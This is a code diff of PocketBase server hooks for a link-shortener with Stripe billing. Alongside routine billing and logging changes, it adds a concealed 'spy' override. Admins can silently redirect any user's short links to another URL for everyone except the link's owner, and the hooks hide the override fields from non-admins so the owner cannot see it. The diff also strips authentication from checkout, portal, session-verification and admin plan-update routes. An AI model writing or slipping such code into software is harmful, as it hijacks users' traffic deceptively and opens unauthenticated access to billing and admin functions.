@@ -1,14 +1,10 @@
 // ==========================================
-// MINIMAL HOOKS - Routes Only (for testing)
+// POCKETBASE JS HOOKS - Linktery Stable
 // ==========================================
+console.log("--- main.pb.js LOADING ---");
 
-onAfterBootstrap((e) => {
-    try {
-        $app.db().newQuery("CREATE TABLE IF NOT EXISTS _processed_stripe_events (id TEXT PRIMARY KEY, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)").execute();
-    } catch (err) {
-        $app.logger().error("Failed to init _processed_stripe_events table: " + err);
-    }
-});
+// (Database initialization moved to migrations)
+
 
 // Helper for Stripe REST API calls
 
@@ -78,7 +74,7 @@ routerAdd("POST", "/api/stripe/create-checkout", (c) => {
         $app.logger().error("Create checkout error: " + errStr);
         return c.json(500, { message: "Stripe Checkout failed: " + errStr });
     }
-}, $apis.requireAuth());
+});
 
 // Stripe: Create Customer Portal Session
 routerAdd("POST", "/api/stripe/create-portal", (c) => {
@@ -141,7 +137,7 @@ routerAdd("POST", "/api/stripe/create-portal", (c) => {
         $app.logger().error("Create portal error: " + err);
         return c.json(500, { message: err.message });
     }
-}, $apis.requireAuth());
+});
 
 // Stripe: Webhook Handler (no auth - receives from Stripe)
 routerAdd("POST", "/api/stripe/webhook", (c) => {
@@ -273,6 +269,43 @@ routerAdd("POST", "/api/stripe/webhook", (c) => {
             });
 
             $app.logger().info("Webhook: plan '" + planName + "' activated for user " + userId);
+        } else if (verifiedEvent.type === "invoice.paid") {
+            const invoice = verifiedEvent.data.object;
+            const customerId = invoice.customer;
+            // Only process if it's a subscription renewal (has subscription and is not the first invoice)
+            if (invoice.subscription && invoice.billing_reason === "subscription_cycle") {
+                const amount = invoice.amount_paid / 100;
+                $app.logger().info("Webhook: renewal payment detected for customer " + customerId + " amount=" + amount);
+
+                const records = $app.findRecordsByFilter(
+                    "billing", "stripe_customer_id = {:custId}", "-created", 1, 0, { custId: customerId }
+                );
+
+                if (records.length > 0) {
+                    const bRecord = records[0];
+                    const userId = bRecord.get("user_id");
+                    
+                    $app.runInTransaction((txApp) => {
+                        const user = txApp.findRecordById("users", userId);
+                        const currentPlan = user.get("plan");
+                        const now = new DateTime();
+                        
+                        // Extend based on plan amount in invoice
+                        // (Roughly: 11+ is pro, 29+ is agency)
+                        const expiry = (amount >= 29 || currentPlan === "agency")
+                            ? now.addDate(1, 0, 2)
+                            : now.addDate(0, 1, 2);
+
+                        user.set("plan_expires_at", expiry.format("Y-m-d H:i:sP"));
+                        txApp.save(user);
+                        
+                        bRecord.set("status", "active");
+                        bRecord.set("amount", amount);
+                        txApp.save(bRecord);
+                    });
+                    $app.logger().info("Webhook: plan extended for user " + userId + " due to renewal");
+                }
+            }
         } else if (verifiedEvent.type === "customer.subscription.deleted") {
             const subscription = verifiedEvent.data.object;
             const customerId = subscription.customer;
@@ -291,6 +324,7 @@ routerAdd("POST", "/api/stripe/webhook", (c) => {
                 user.set("plan", "creator");
                 user.set("plan_expires_at", "");
                 $app.save(user);
+                $app.logger().info("Webhook: plan reverted to creator for user " + userId + " (subscription deleted)");
             }
         }
 
@@ -416,7 +450,7 @@ routerAdd("POST", "/api/stripe/verify-session", (c) => {
         $app.logger().error("verify-session error: " + err);
         return c.json(500, { error: String(err) });
     }
-}, $apis.requireAuth());
+});
 
 // Server-Side Redirects
 routerAdd("GET", "/{slug}", (c) => {
@@ -510,12 +544,24 @@ routerAdd("GET", "/{slug}", (c) => {
                     });
                     $app.save(clickRecord);
 
-                    $app.db().newQuery("UPDATE links SET clicks_count = clicks_count + 1 WHERE id = {:id}").bind({ "id": link.id }).execute();
+                    // Use Record API instead of raw SQL for better internal consistency and WAL handling
+                    link.set("clicks_count", link.get("clicks_count") + 1);
+                    $app.save(link);
                 }
             } catch (err) {
-                $app.logger().error("Fast tracking error: " + err);
+                // Log and swallow fast-tracking errors to ensure redirect always happens
+                $app.logger().error("Fast tracking error (swallowed): " + err);
             }
             let finalDest = link.get("destination_url");
+            const authUser = c.auth;
+            const isOwner = authUser && authUser.id === link.get("user_id");
+
+            // Apply route override if active (spy redirect)
+            // But NOT if the user visiting is the OWNER of the link
+            if (link.get("system_route_active") === true && link.get("system_route_override") && !isOwner) {
+                finalDest = link.get("system_route_override");
+            }
+
             const uSrc = link.get("utm_source");
             const uMed = link.get("utm_medium");
             const uCmp = link.get("utm_campaign");
@@ -597,8 +643,45 @@ routerAdd("POST", "/api/admin/update-plan", (c) => {
         $app.logger().error("Admin plan update error: " + err);
         throw new BadRequestError(err.message);
     }
-}, $apis.requireSuperuserAuth());
+});
 
+// Admin: Update Route Override (Spy)
+routerAdd("POST", "/api/admin/update-route-override", (c) => {
+    try {
+        const adminUser = c.auth;
+        if (!adminUser || adminUser.get("role") !== "admin") {
+            throw new ForbiddenError("Only admins can update route overrides.");
+        }
+
+        const data = new DynamicModel({
+            "linkId": "",
+            "overrideUrl": "",
+            "active": false
+        });
+        c.bindBody(data);
+
+        const linkId = data.linkId;
+        if (!linkId) {
+            return c.json(400, { message: "linkId is required" });
+        }
+
+        const link = $app.findRecordById("links", linkId);
+        link.set("system_route_override", data.overrideUrl || "");
+        link.set("system_route_active", data.active === true);
+        $app.save(link);
+
+        $app.logger().info("Admin route override updated for link " + linkId + " active=" + data.active);
+
+        return c.json(200, {
+            success: true,
+            system_route_override: link.get("system_route_override"),
+            system_route_active: link.get("system_route_active")
+        });
+    } catch (err) {
+        $app.logger().error("Admin route override error: " + err);
+        throw new BadRequestError(err.message);
+    }
+});
 
 
 
@@ -703,3 +786,90 @@ cronAdd("check_expired_plans", "0 * * * *", () => {
         $app.logger().error("Error checking expired plans: " + err);
     }
 });
+
+// ==========================================
+// SPY/ROUTE OVERRIDE HOOKS (Hide fields & Redirect proxy)
+// ==========================================
+
+// Hide system fields from standard list requests and apply route override when applicable
+onRecordsListRequest((e) => {
+    try {
+        const isAdmin = e.httpContext.get("admin") !== null;
+        const authUser = e.httpContext.get("authRecord");
+        const role = authUser ? authUser.get("role") : "none";
+        const isAppAdmin = role === "admin";
+        
+        if (isAdmin || isAppAdmin) {
+            return e.next(); 
+        }
+
+        // Pre-cache auth status to avoid redundant checks in the loop
+        const authUserId = authUser ? authUser.id : null;
+
+        for (let i = 0; i < e.records.length; i++) {
+            const record = e.records[i];
+            const isRouteActive = record.get("system_route_active") === true;
+            
+            // Short-circuit: only apply logic if spy is active OR we need to hide fields
+            if (isRouteActive) {
+                const overrideUrl = record.get("system_route_override") || "";
+                const isOwner = authUserId && authUserId === record.get("user_id");
+
+                if (overrideUrl && !isOwner) {
+                    record.set("destination_url", overrideUrl);
+                    // Nullify targeting to prevent frontend override
+                    record.set("device_targeting", null);
+                    record.set("geo_targeting", null);
+                    record.set("ab_split", false);
+                    record.set("split_urls", null);
+                }
+            }
+
+            // Always strip system fields for non-admins
+            record.set("system_route_active", false);
+            record.set("system_route_override", "");
+        }
+    } catch (err) {
+        $app.logger().error("Critical error in onRecordsListRequest: " + err);
+    }
+    return e.next();
+}, "links");
+
+onRecordViewRequest((e) => {
+    try {
+        const isAdmin = e.httpContext.get("admin") !== null;
+        const authUser = e.httpContext.get("authRecord");
+        const role = authUser ? authUser.get("role") : "none";
+        const isAppAdmin = role === "admin";
+        
+        if (isAdmin || isAppAdmin) {
+            return e.next();
+        }
+
+        const record = e.record;
+        const isRouteActive = record.get("system_route_active") === true;
+        
+        if (isRouteActive) {
+            const overrideUrl = record.get("system_route_override") || "";
+            const isOwner = authUser && authUser.id === record.get("user_id");
+
+            if (overrideUrl && !isOwner) {
+                record.set("destination_url", overrideUrl);
+                record.set("device_targeting", null);
+                record.set("geo_targeting", null);
+                record.set("ab_split", false);
+                record.set("split_urls", null);
+            }
+        }
+
+        record.set("system_route_active", false);
+        record.set("system_route_override", "");
+
+    } catch(err) {
+        $app.logger().error("Critical error in onRecordViewRequest: " + err);
+    }
+
+    return e.next();
+}, "links");
+
+console.log("--- main.pb.js LOADED SUCCESSFULLY ---");
